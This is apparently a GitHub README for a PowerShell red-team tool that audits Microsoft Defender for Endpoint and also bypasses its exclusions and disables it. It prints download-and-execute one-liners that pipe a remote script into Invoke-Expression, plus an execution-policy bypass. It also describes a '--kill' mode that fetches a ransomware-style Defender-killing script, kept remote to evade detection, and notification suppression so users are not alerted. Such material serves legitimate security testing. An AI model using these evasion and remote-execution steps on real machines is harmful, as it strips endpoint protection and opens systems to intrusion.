# fkmde

![image](https://github.com/user-attachments/assets/8fa1fc4b-43c1-4789-8184-0138bd81d0b1)

`fkmde` is a specialized powershell script designed to evaluate the configuration and operational security of Microsoft Defender for Endpoint (MDE). It aids security professionals, system administrators, and penetration testers in identifying potential vulnerabilities and misconfigurations that might be exploited in a real-world attack.

## Features
- **Defender Full Audit**: Quickly assesses the status of real-time protection, active/passive mode, tamper protection, bitlocker, memory integrity and exclusion settings to detect overly permissive rules that might allow malware to bypass scanning.
- **Bypass Exclusions and ASR Rules**: Utilizes Event 1121 and 5007 to bypass the protected exclusions list in MDE.
- **Exclusion Enumeration**: Allows for low privilege exclusion enumeration, without relying on event log bypass.
- **Defender Tampering**: PendingFileRenameOperations + Junctions EDR Disable
- **Defender Killing**: The script uses techniques similar to those used by Clop Ransomware to disable and evade Microsoft Defender.

## Usage

```powershell
fkmde.ps1
fkmde.ps1 --enum <path> [depth]
fkmde.ps1 --kill                     # Run the script from URL
fkmde.ps1 --kill <path>              # Specify a directory for the script to download & execute from
```

- **`--kill` Parameter**  
  This parameter triggers a script that implements techniques similar to those used by Clop Ransomware to disable and evade Microsoft Defender. The script is not hardcoded into `fkmde`, but dynamically fetched from an external source to avoid pre-execution detection. This should be used *only* in secure, isolated environments for research purposes. It is possible to specify a custom directory using the optional <path> argument to download and run the kill script.

- **`--enum <path> [depth]` Parameter**  
  This parameter performs a comprehensive enumeration of directories by using `MpCmdRun.exe`, scanning for exclusions or misconfigurations without relying on event logs or admin permissions. The script dynamically disables Windows Defender popup notifications during execution to provide a seamless experience without alerting users. Upon completion, it safely re-enables the notifications.
  
> [!NOTE]
> Any scripts tampering with the defender are not directly embedded in `fkmde`. Instead, they are loaded dynamically to minimize detection by Defender for Endpoint when the tool is used solely for enumeration purposes.

The script can also be run with and without parameterized modes directly from github.

```powershell
  // basic method with iex
  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1')

  // parameterized mode with iex and irm
  Invoke-Expression "& { $(Invoke-RestMethod https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1) } --enum C:\Windows 3"
```

> By default, the PowerShell [execution policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) is set to `Restricted` on clients, and `RemoteSigned` on servers, when a new `powershell.exe` process is started. These policies block the execution of (unsigned) scripts, but they can be overriden within the current scope. However, this trick does not work when the execution policy is enforced through a GPO. In this case, after starting a new PowerShell session, you can load the script with the second command.

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
Get-Content .\fkmde.ps1 | Out-String | Invoke-Expression
```

![image](https://github.com/user-attachments/assets/4fd4b81f-c8a0-4a35-a4f8-2a688df8c5a8)

![image](https://github.com/user-attachments/assets/f722aaed-7dec-47ac-92a4-344cbcd5a7d7)

![image](https://github.com/user-attachments/assets/d6ed731a-4737-46c8-91d0-506f49e65f4f)

![image](https://github.com/user-attachments/assets/82f87057-d573-43ce-8745-0382374b5dd0)

![image](https://github.com/user-attachments/assets/dd051244-e1aa-46aa-a0d5-0bd0298a234a)

## Disclaimer
This tool is intended for educational and security research purposes only. The author is not responsible for misuse or for any damage that may occur from using this tool. It is the end user's responsibility to comply with all applicable laws and regulations. The use of this tool against targets without prior mutual consent is illegal.

## Credits
- [VakninHai](https://x.com/VakninHai/status/1796628601535652289/photo/1) - Privilege Bypassing through Windows Event 5007
- [ViziosDe](https://raw.githubusercontent.com/ViziosDe/MDExclusionParser/main/Invoke-MDExclusionParser.ps1) - Privilege Bypassing through Windows Event 1121
- [Friends Security](https://github.com/Friends-Security/SharpExclusionFinder) - Exclusions through MpCmdRun.exe
- [rad9800](https://github.com/rad9800/FileRenameJunctionsEDRDisable) - PendingFileRenameOperations + Junctions EDR Disable
